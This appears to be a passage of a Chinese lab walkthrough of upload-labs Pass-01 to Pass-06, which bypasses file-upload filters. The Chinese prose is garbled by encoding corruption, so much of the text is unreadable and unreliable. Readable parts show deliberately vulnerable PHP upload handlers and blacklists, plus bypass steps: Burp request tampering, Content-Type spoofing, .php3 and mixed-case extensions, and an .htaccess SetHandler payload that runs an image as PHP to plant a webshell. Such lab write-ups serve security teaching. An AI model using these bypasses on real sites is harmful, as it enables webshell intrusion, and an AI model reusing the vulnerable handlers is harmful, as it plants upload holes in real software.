¼å¼æ¥åˆ¤æ–­æ–‡ä»¶èƒ½å¦ä¸Šä¼ ï¼›</li><li>ç»•è¿‡æ–¹å¼ï¼šå°†æœ¨é©¬ä¼ªè£…æˆ.jpg|.png|.gifæ–‡ä»¶ï¼Œä¸Šä¼ åburpæ‹¦æˆªæ•°æ®åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åç¼€ä¸º.phpï¼Œå†forward.</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvJdIg.png" alt="JvJdIg.png"></p><p>æ”¹åŒ…ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJtqf.png" alt="JvJtqf.png"></p><h3 id="å…¶ä»–æ–¹æ³•"><a href="#å…¶ä»–æ–¹æ³•" class="headerlink" title="å…¶ä»–æ–¹æ³•"></a>å…¶ä»–æ–¹æ³•</h3><ol><li><p>ä¿®æ”¹jsè„šæœ¬</p></li><li><p>æµè§ˆå™¨ç¦æ­¢ä½¿ç”¨jsè„šæœ¬ï¼ˆç«ç‹ä¸‹ğŸ¦Š)</p><ul><li>åœ¨Firefoxåœ°å€æ é‡Œè¾“å…¥â€œabout:configâ€ã€‚åœ¨æœç´¢æ è¾“å…¥â€œjavascript.enabledâ€æŸ¥æ‰¾åˆ°é¦–é€‰é¡¹ã€‚ç‚¹å‡»é¼ æ ‡å³é”®é€‰æ‹©â€œåˆ‡æ¢â€ï¼ŒæŠŠâ€œjavascript.enabledâ€é”®å€¼æ”¹ä¸ºâ€œfalseâ€</li></ul></li></ol><p>+++</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼</strong>è¿™æ¬¡ç»™çš„ä¸æ˜¯ç™½åå•æˆ–è€…é»‘åå•ï¼Œè€Œæ˜¯å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œåº”è¯¥ä¸ºMIMEçš„æ£€æŸ¥ã€‚</p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼</p></blockquote><p><strong>è¡¥å……ï¼š</strong><br>MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼š</span><br><span class="line">è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html</span><br><span class="line">xmlæ–‡æ¡£ .xml text/xml</span><br><span class="line">XHTMLæ–‡æ¡£ .xhtml application/xhtml+xml</span><br><span class="line">æ™®é€šæ–‡æœ¬ .txt text/plain</span><br><span class="line">RTFæ–‡æœ¬ .rtf application/rtf</span><br><span class="line">PDFæ–‡æ¡£ .pdf application/pdf</span><br><span class="line">Microsoft Wordæ–‡ä»¶ .word application/msword</span><br><span class="line">PNGå›¾åƒ .png image/png</span><br><span class="line">GIFå›¾å½¢ .gif image/gif</span><br><span class="line">JPEGå›¾å½¢ .jpeg,.jpg image/jpeg</span><br><span class="line">auå£°éŸ³æ–‡ä»¶ .au audio/basic</span><br><span class="line">MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi</span><br><span class="line">RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio</span><br><span class="line">MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg</span><br><span class="line">AVIæ–‡ä»¶ .avi video/x-msvideo</span><br><span class="line">GZIPæ–‡ä»¶ .gz application/x-gzip</span><br><span class="line">TARæ–‡ä»¶ .tar application/x-tar</span><br><span class="line">ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream</span><br></pre></td></tr></table></figure><p>+++</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯ç™½åå•</strong>;å¯¹æ–‡ä»¶çš„MIME(Multipurpose Internet Mail Extensions)è¿›è¡Œäº†éªŒè¯ï¼Œåªå…è®¸å›¾ç‰‡ç±»æ–‡ä»¶ä¸Šä¼ é€šè¿‡</p></li><li><p>ç»•è¿‡æ–¹å¼ï¼š</p><ol><li><p>ç›´æ¥ä¸Šä¼ å«æœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶ï¼ŒburpæˆªåŒ…ï¼Œä¿®æ”¹åç¼€ä¸ºphpæ–‡ä»¶</p></li><li><p>ç›´æ¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼ŒburpæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typeä¸ºimage/pngç­‰å…è®¸ç±»å‹</p></li></ol></li></ul><p>+++</p><p>  æ­¤å¤„æˆ‘ä»¬åˆ©ç”¨2ä¿®æ”¹Content-Typeä¸ºimage/pngï¼š<br>æŠ“åŒ…ï¼š<br>[4]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJUZ8.png" alt="JvJUZ8.png"></p><p>æ”¹åŒ…ï¼š<br>[5]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvRDfA.png" alt="JvRDfA.png"></p><p>å‘åŒ…ï¼š<br>æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥å°†æ–‡ä»¶æ‹–å‡ºæ¥å³å¯å¾—è®¿é—®ï¼›</p><p><img src="https://s1.ax1x.com/2020/05/02/JvWp11.png" alt="JvWp11.png"></p><p>+++</p><h2 id="Psaa-03"><a href="#Psaa-03" class="headerlink" title="Psaa-03"></a>Psaa-03</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼</strong></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•éªŒè¯</strong>;(ç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶)</p></li><li><p>ç»•è¿‡æ–¹å¼ï¼š<br>(1)å¯ä¸Šä¼ .php3.phtml .phps .php5 .phtâ€¦ç­‰è¿™æ ·å¯ä»¥è¢«æœåŠ¡å™¨è§£æçš„åç¼€å<br>(2)é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ªhack.pngæ–‡ä»¶(å«æœ¨é©¬)<br>é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€hack.pngâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œæ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ<br>.htaccessæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "hack.png"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>æ­¤å¤„ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º.php3;<br>[8]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvR66P.png" alt="JvR66P.png"></p><p>ä¸Šä¼ æˆåŠŸï¼<br>+++</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !</strong> </p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•åŠ å¼ºéªŒè¯</strong>;ä¸Pass-03ç±»ä¼¼ï¼Œåªæ˜¯å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åçš„é™åˆ¶ç§ç±»å¢åŠ </p></li><li><p>ç»•è¿‡æ–¹å¼ï¼šé‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡(ç¬¬3å…³(2))</p><ol><li>ä¸Šä¼ <code>.htaccessæ–‡ä»¶</code></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "hack.png"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>ä¸Šä¼ hack.pngï¼ˆå«æœ¨é©¬ï¼‰</li></ol></li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvRBYd.png" alt="JvRBYd.png"></p><p>ä¸Šä¼ æˆåŠŸï¼Œå¹¶ä»¥phpè¿›è¡Œäº†è§£æï¼</p><p>+++</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼            *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼</p></blockquote><p>Pass-05å‘é»‘åå•ä¸­å¢åŠ äº†<code>.htaccess</code>åç¼€æ–‡ä»¶;</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ é™¤äº†è¯¥è¯­å¥ï¼š<code>$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</code></p><p>+++</p><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•è¶…çº§åŠ å¼º</strong>;.htaccessåŠ å…¥äº†é»‘åå•ï¼Œå–æ¶ˆäº†åç¼€åå…¨å˜ä¸ºå°å†™å­—æ¯çš„strtolowerï¼ˆï¼‰å‡½æ•°</li><li>ç»•è¿‡æ–¹å¼ï¼šé‡‡ç”¨å¤§å°å†™æ··åˆæ–¹å¼ç»•è¿‡.PhP,.PHp5ï¼Œæˆ–ç€.hTacCesSæ–‡ä»¶â€¦</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvR0FH.png" alt="JvR0FH.png"></p><p>ä¸Šä¼ æˆåŠŸï¼</p><p>+++</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ 